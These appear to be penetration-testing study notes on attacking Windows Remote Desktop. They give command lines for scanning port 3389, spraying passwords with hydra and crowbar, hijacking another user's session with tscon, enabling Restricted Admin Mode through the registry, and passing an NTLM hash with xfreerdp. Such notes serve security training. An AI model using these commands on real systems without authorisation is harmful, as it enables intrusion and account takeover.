>[Remote Desktop Protocol (RDP)](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection. It is also one of the most popular administration tools, allowing system administrators to centrally control their remote systems with the same functionality as if they were on-site. In addition, managed service providers (MSPs) often use the tool to manage hundreds of customer networks and systems. Unfortunately, while RDP greatly facilitates remote administration of distributed IT systems, it also creates another gateway for attacks.

---

By default, RDP uses port `TCP/3389`. Using `Nmap`, we can identify the available RDP service on the target host:

```
$ nmap -Pn -p3389 192.168.2.143 
```
#nmap #rdp

## Misconfigurations

>Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. Although it is not common, we could find an RDP service without a password if there is a misconfiguration.

```
$ crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

```
$ hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

```
$ rdesktop -u admin -p password123 192.168.2.143
```
#rdesktop #login #hydra #crowbar
#### RDP Session Hijacking

>As shown in the example below, we are logged in as the user `juurena` (UserID = 2) who has `Administrator` privileges. Our goal is to hijack the user `lewen` (User ID = 4), who is also logged in via RDP.

```c
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

```c
C:\htb> query user
```

```c
C:\htb> net start sessionhijack
```
#cmd #net #tscon


## RDP Pass-the-Hash (PtH)

>`Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:

		Adding the DisableResrictedAdmin Registry Key
```c
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
#cmd #reg #pth 

![[rdp_session-5.png]]


```
$ xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```
#xfreerdp #pth #login 